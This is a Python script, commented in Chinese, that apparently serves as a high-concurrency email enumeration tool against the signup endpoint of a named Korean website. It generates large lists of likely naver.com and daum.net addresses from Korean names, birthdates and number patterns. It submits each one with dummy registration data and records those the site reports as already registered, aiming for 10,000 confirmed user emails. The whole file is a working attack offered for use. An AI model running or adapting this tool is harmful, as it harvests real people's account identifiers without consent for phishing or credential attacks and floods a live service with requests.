#!/usr/bin/env python3
"""
us-campus 邮箱枚举 v3 — 极致优化结合体
- SQLite WAL 去重 (批量写入, 多进程安全)
- 候选落盘 + 行号断点续跑 (重启不重建字典)
- 热路径零文件锁 (仅批次结束 bulk flush)
- 分片 + 高并发 signUp 预言机
"""
import argparse
import fcntl
import itertools
import json
import sqlite3
import ssl
import threading
import time
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import date
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.request import HTTPCookieProcessor, HTTPSHandler, Request, build_opener

BASE = Path("/data/automation/results/us-campus.co.kr")
STATE_DIR = BASE / "email_enum_state"
TESTED_DB = STATE_DIR / "tested.db"
GLOBAL_HITS = STATE_DIR / "hits_all.jsonl"
CAND_VERSION = 3

ALL_SURNAMES = [
    "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "jo", "yoon", "yun", "jang", "lim", "im",
    "han", "oh", "seo", "shin", "kwon", "hwang", "ahn", "an", "song", "hong", "yu", "yoo", "moon", "mun",
    "son", "bae", "baek", "heo", "hur", "nam", "ha", "kwak", "gu", "ko", "go", "jeon", "jun", "ryu", "noh",
    "roh", "cha", "min", "jin", "sim", "shim", "yang", "won", "byun", "byeon", "chung", "woo", "gil", "gang",
    "gong", "kwang", "ma", "mok", "ban", "bang", "bong", "seok", "suk", "shin", "sok", "um", "uhm", "eom",
    "yeo", "yo", "ok", "oon", "wook", "pyo", "hae", "hyun", "in", "jae", "chae", "cheon", "chun",
]

SHARD_GROUPS = [
    ["kim", "lee", "park", "choi"],
    ["jung", "jeong", "kang", "cho", "jo", "yoon", "yun"],
    ["jang", "lim", "im", "han", "oh", "seo", "shin", "kwon", "hwang"],
    None,
]

GIVEN = [
    "min", "jun", "soo", "su", "young", "jin", "hyun", "hyeon", "woo", "ho", "ji", "yeon", "seo", "yoon", "yun",
    "ha", "bin", "gyu", "kyu", "seok", "suk", "won", "chan", "sung", "seong", "dong", "jae", "tae", "sang", "chul",
    "cheol", "hee", "hui", "eun", "in", "ah", "a", "ri", "rae", "kyung", "gyeong", "hye", "mi", "ye", "bo", "na",
    "minjun", "minjae", "seojun", "jiho", "jiwoo", "doyun", "yejun", "siwoo", "hajun", "minseo", "haeun", "jimin",
    "jisoo", "sujin", "hyunwoo", "sangmin", "jaehyun", "donghyun", "seungmin", "seunghyun", "taehyun", "jihoon",
    "junho", "sungmin", "jonghyun", "minsu", "minho", "jieun", "hyunju", "eunji", "yujin", "yuna", "jiyeon",
    "sohee", "juhee", "haneul", "areum", "sora", "nari", "bora", "gunwoo", "yong", "chaeun", "seoah", "haru",
    "siyun", "jiyun", "yejin", "hyerin", "dahye", "seungho", "youngjae", "jungmin", "kyungmin", "hyunsoo",
]

COMMONS = [
    "user", "love", "happy", "money", "stock", "king", "sky", "star", "moon", "sun", "korea", "seoul", "campus",
    "hello", "world", "apple", "blue", "red", "student", "vip", "gold",
]

CTX = ssl.create_default_context()


class TestedStore:
    """SQLite WAL 批量写入; worker 进程不加载全量内存。"""

    def __init__(self, db_path: Path, load_mem: bool = False):
        self.db_path = db_path
        self._local = threading.local()
        self._mem = set()
        if load_mem:
            self._mem = self._load_mem_set()

    def _conn(self):
        if not getattr(self._local, "conn", None):
            c = sqlite3.connect(self.db_path, timeout=60, check_same_thread=False)
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.execute("CREATE TABLE IF NOT EXISTS tested(email TEXT PRIMARY KEY)")
            self._local.conn = c
        return self._local.conn

    def _load_mem_set(self):
        conn = sqlite3.connect(self.db_path)
        s = {row[0] for row in conn.execute("SELECT email FROM tested")}
        conn.close()
        return s

    def __contains__(self, item):
        return item.lower() in self._mem

    def __len__(self):
        if self._mem:
            return len(self._mem)
        conn = sqlite3.connect(self.db_path)
        n = conn.execute("SELECT COUNT(*) FROM tested").fetchone()[0]
        conn.close()
        return n

    def bulk_add(self, emails):
        if not emails:
            return
        rows = [(e.lower(),) for e in emails]
        conn = self._conn()
        conn.executemany("INSERT OR IGNORE INTO tested VALUES(?)", rows)
        conn.commit()


def shard_surnames(shard: int, shards: int):
    if shards != 4:
        n = len(ALL_SURNAMES)
        size = (n + shards - 1) // shards
        return ALL_SURNAMES[shard * size : (shard + 1) * size]
    if shard >= 3:
        used = set(SHARD_GROUPS[0] + SHARD_GROUPS[1] + SHARD_GROUPS[2])
        return [s for s in ALL_SURNAMES if s not in used]
    return SHARD_GROUPS[shard]


def iter_slim_emails(surnames):
    years2 = [f"{y:02d}" for y in range(70, 100)] + [f"{y:02d}" for y in range(0, 10)]
    years4 = [str(y) for y in range(1975, 2006)]
    top = surnames[: min(25, len(surnames))]
    seen = set()

    def emit(raw):
        e = raw.lower()
        if e in seen:
            return
        seen.add(e)
        return e

    for s, g, yr in itertools.product(surnames, GIVEN, years2):
        for loc in (s + g + yr, g + s + yr):
            e = emit(f"{loc}@naver.com")
            if e:
                yield e

    for s in top:
        for y in range(1975, 2008):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    e = emit(f"{s}{bd}@naver.com")
                    if e:
                        yield e

    for s in surnames:
        for y in years2:
            e = emit(f"{s}{y}@naver.com")
            if e:
                yield e
            for n in range(0, 100):
                e = emit(f"{s}{y}{n:02d}@naver.com")
                if e:
                    yield e
        for n in range(1000, 10000):
            e = emit(f"{s}{n}@naver.com")
            if e:
                yield e

    for s, g in itertools.product(surnames, GIVEN[:40]):
        for loc in (s + g, g + s, s + g + "1", s + g + "12"):
            e = emit(f"{loc}@naver.com")
            if e:
                yield e

    phase2_s = surnames[: min(8, len(surnames))]
    for s, g in itertools.product(phase2_s, GIVEN[:30]):
        for y4 in years4:
            for raw in (f"{s}{g}{y4}@naver.com", f"{g}{s}{y4}@naver.com"):
                e = emit(raw)
                if e:
                    yield e
        for y in years2:
            for raw in (f"{s}{g}{y}@daum.net", f"{g}{s}{y}@daum.net"):
                e = emit(raw)
                if e:
                    yield e

    for s in top[:12]:
        for y in range(1975, 2008):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    e = emit(f"{s}{bd}@daum.net")
                    if e:
                        yield e

    for c in COMMONS:
        for n in range(1000, 10000):
            e = emit(f"{c}{n}@naver.com")
            if e:
                yield e
        for yr in years2:
            for n in range(100, 1000):
                e = emit(f"{c}{yr}{n}@naver.com")
                if e:
                    yield e


def ensure_candidate_file(shard_dir: Path, surnames, seen_hit: set):
    cand_file = shard_dir / "candidates.txt"
    meta_file = shard_dir / "candidates.meta.json"
    if cand_file.exists() and meta_file.exists():
        try:
            meta = json.loads(meta_file.read_text(encoding="utf-8"))
            if meta.get("version") == CAND_VERSION and meta.get("count", 0) > 0:
                return cand_file, meta["count"]
        except Exception:
            pass

    print("loading tested set for candidate filter...", flush=True)
    tested = TestedStore(TESTED_DB, load_mem=True)
    print(f"tested loaded {len(tested)}", flush=True)
    t0 = time.time()
    count = 0
    with open(cand_file, "w", encoding="utf-8") as f:
        for e in iter_slim_emails(surnames):
            if e in tested or e in seen_hit:
                continue
            f.write(e + "\n")
            count += 1
    meta_file.write_text(
        json.dumps({"version": CAND_VERSION, "count": count, "built": time.time()}, indent=2),
        encoding="utf-8",
    )
    print(f"candidates written {count} in {time.time()-t0:.1f}s", flush=True)
    return cand_file, count


def load_hits():
    hits = []
    seen = set()
    paths = []
    if GLOBAL_HITS.exists():
        paths.append(GLOBAL_HITS)
    paths += sorted(BASE.glob("email_enum*/hits.jsonl"))
    for p in paths:
        if not p.exists():
            continue
        with open(p, encoding="utf-8", errors="ignore") as f:
            for line in f:
                try:
                    r = json.loads(line)
                    em = (r.get("email") or "").lower()
                    if em and em not in seen:
                        seen.add(em)
                        hits.append(r)
                except Exception:
                    pass
    return hits, seen


def append_global_hit(rec: dict):
    GLOBAL_HITS.parent.mkdir(parents=True, exist_ok=True)
    with open(GLOBAL_HITS, "a", encoding="utf-8") as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        fcntl.flock(f, fcntl.LOCK_UN)


def export_results(out_dir: Path, hits):
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "registered_emails.json").write_text(json.dumps(hits, indent=2, ensure_ascii=False), encoding="utf-8")


def read_batch(cand_file: Path, line_no: int, size: int):
    batch = []
    with open(cand_file, encoding="utf-8") as f:
        for i, line in enumerate(f):
            if i < line_no:
                continue
            e = line.strip().lower()
            if e:
                batch.append(e)
            if len(batch) >= size:
                return batch, i + 1
    return batch, line_no + len(batch)


def run_shard(args):
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    shard_dir = STATE_DIR / f"shard_{args.shard}"
    shard_dir.mkdir(parents=True, exist_ok=True)
    out_dir = shard_dir / "run"
    out_dir.mkdir(parents=True, exist_ok=True)

    hits_path = out_dir / "hits.jsonl"
    prog_path = out_dir / "progress.txt"
    state_path = shard_dir / "state.json"
    resume_path = shard_dir / "resume.line"

    if not TESTED_DB.exists():
        raise SystemExit(f"missing {TESTED_DB}, run usc-enum-bootstrap.py first")

    tested_store = TestedStore(TESTED_DB, load_mem=False)
    hits, seen_hit = load_hits()
    surnames = shard_surnames(args.shard, args.shards)
    print(f"shard={args.shard}/{args.shards} workers={args.workers}", flush=True)

    cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, seen_hit)
    print(f"candidates={total_cands} file={cand_file}", flush=True)

    line_no = 0
    if resume_path.exists():
        try:
            line_no = int(resume_path.read_text().strip())
        except Exception:
            line_no = 0
    elif (shard_dir / "resume.idx").exists():
        try:
            line_no = int((shard_dir / "resume.idx").read_text().strip())
        except Exception:
            line_no = 0
    print(f"resume line={line_no} remain={max(0, total_cands - line_no)}", flush=True)

    if not hits_path.exists() or hits_path.stat().st_size == 0:
        with open(hits_path, "w", encoding="utf-8") as f:
            for r in hits:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")

    stats = {"tested": 0, "errors": 0, "retried": 0}
    stats_lock = threading.Lock()
    hits_lock = threading.Lock()
    stop_flag = threading.Event()
    tls = threading.local()
    start = time.time()
    batch_size = args.batch_size
    export_every = 10
    batch_num = 0

    def get_op(force=False):
        if force or getattr(tls, "op", None) is None or getattr(tls, "n", 0) >= 500:
            tls.op = build_opener(HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX))
            tls.n = 0
            try:
                tls.op.open(Request("https://us-campus.co.kr/member/join", headers={"User-Agent": "Mozilla/5.0"}), timeout=8)
            except Exception:
                pass
        tls.n += 1
        return tls.op

    def do_req(em, op):
        data = {
            "email": em,
            "password": "Test1234!",
            "confirmed": "Test1234!",
            "name": "t",
            "cellphone": "01055550000",
            "countryCode": "82",
            "cellphoneCertCode": "X",
            "cellphoneCertKey": "X",
        }
        req = Request(
            "https://us-campus.co.kr/member/signUp",
            urllib.parse.urlencode(data).encode(),
            method="POST",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "Referer": "https://us-campus.co.kr/member/join",
                "Origin": "https://us-campus.co.kr",
                "User-Agent": "Mozilla/5.0",
            },
        )
        try:
            r = op.open(req, timeout=12)
            return json.loads(r.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            return json.loads(e.read().decode("utf-8", "replace"))

    def check(em):
        if stop_flag.is_set():
            return None
        j = None
        for attempt in range(args.retries):
            if stop_flag.is_set():
                return None
            op = get_op(force=(attempt > 0))
            try:
                j = do_req(em, op)
                if attempt > 0:
                    with stats_lock:
                        stats["retried"] += 1
                break
            except Exception:
                tls.op = None
                time.sleep(0.03 * (attempt + 1))
        if j is None:
            with stats_lock:
                stats["errors"] += 1
            return em
        msg = j.get("message") or ""
        if "이미" in msg and "이메일" in msg:
            with hits_lock:
                if em not in seen_hit:
                    seen_hit.add(em)
                    rec = {"email": em, "message": msg, "ts": time.time(), "shard": args.shard}
                    hits.append(rec)
                    append_global_hit(rec)
                    with open(hits_path, "a", encoding="utf-8") as hf:
                        hf.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    print(f"HIT shard{args.shard} total={len(hits)} {em}", flush=True)
                    if len(hits) >= args.target:
                        stop_flag.set()
        return em

    while line_no < total_cands and not stop_flag.is_set():
        batch_num += 1
        chunk, next_line = read_batch(cand_file, line_no, batch_size)
        if not chunk:
            break

        batch_tested = []
        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = [ex.submit(check, em) for em in chunk]
            for fut in as_completed(futs):
                if stop_flag.is_set():
                    break
                try:
                    em = fut.result()
                    if em:
                        batch_tested.append(em)
                except Exception:
                    pass

        tested_store.bulk_add(batch_tested)
        with stats_lock:
            stats["tested"] += len(batch_tested)

        line_no = next_line
        resume_path.write_text(str(line_no), encoding="utf-8")

        elapsed = time.time() - start
        rps = stats["tested"] / elapsed if elapsed else 0
        line = (
            f"shard={args.shard} line={line_no}/{total_cands} tested={stats['tested']} "
            f"hits={len(hits)} errors={stats['errors']} retried={stats['retried']} rps={rps:.1f} elapsed={elapsed:.0f}s"
        )
        print(line, flush=True)
        prog_path.write_text(line + "\n", encoding="utf-8")
        state_path.write_text(
            json.dumps(
                {
                    "shard": args.shard,
                    "line": line_no,
                    "total": total_cands,
                    "tested": stats["tested"],
                    "hits": len(hits),
                    "errors": stats["errors"],
                    "rps": rps,
                },
                indent=2,
            ),
            encoding="utf-8",
        )
        if batch_num % export_every == 0:
            export_results(out_dir, hits)

    export_results(out_dir, hits)
    print(f"DONE shard={args.shard} hits={len(hits)} tested={stats['tested']} errors={stats['errors']}", flush=True)


def main():
    ap = argparse.ArgumentParser(description="us-campus fast email enum v3")
    ap.add_argument("--shard", type=int, default=0)
    ap.add_argument("--shards", type=int, default=4)
    ap.add_argument("--workers", type=int, default=80)
    ap.add_argument("--batch-size", type=int, default=5000)
    ap.add_argument("--target", type=int, default=10000)
    ap.add_argument("--retries", type=int, default=3)
    run_shard(ap.parse_args())


if __name__ == "__main__":
    main()
